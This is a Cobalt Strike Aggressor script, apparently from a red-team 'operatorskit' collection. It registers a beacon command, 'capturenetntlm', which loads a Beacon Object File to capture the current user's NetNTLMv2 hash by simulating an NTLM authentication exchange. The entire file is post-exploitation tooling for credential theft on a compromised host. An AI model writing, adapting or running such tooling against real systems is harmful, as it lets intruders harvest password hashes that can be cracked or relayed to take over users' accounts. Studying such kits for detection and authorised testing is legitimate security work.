beacon_command_register(
	"capturenetntlm",
    "\c0Capture the NetNTLMv2 hash of the current user.\o",
    "\c7Capture the NetNTLMv2 hash of the current user.\o" .
    "\c7This is done by simulating a NTLM authentication exchange between a client and server to capture the NetNTLMv2 hash.\o\n\n" .
	
    "USAGE:\n" .
    "  capturenetntlm\n\n",
    "operatorskit"
);
	
alias capturenetntlm
{
    local('$bid %cmd $arg_data $bof_path $output_name');

    ($bid) = @_;

    $bof_path    = "capturenetntlm.o";
	$output_name = "capture_net_ntlm";

    %cmd = parse_command(@_);

    if (%cmd is $null)
    {
        berror($bid, "Error parsing command\n");
        return;
    }

    %cmd["file"] = generate_file_name($bid, %cmd["file"], $output_name);

	blog($bid, "Tasked to capture the current user's NetNTLMv2 hash..");

    handle_output_beacon_inline_execute($bid, $bof_path, "go", %cmd, $null);
}
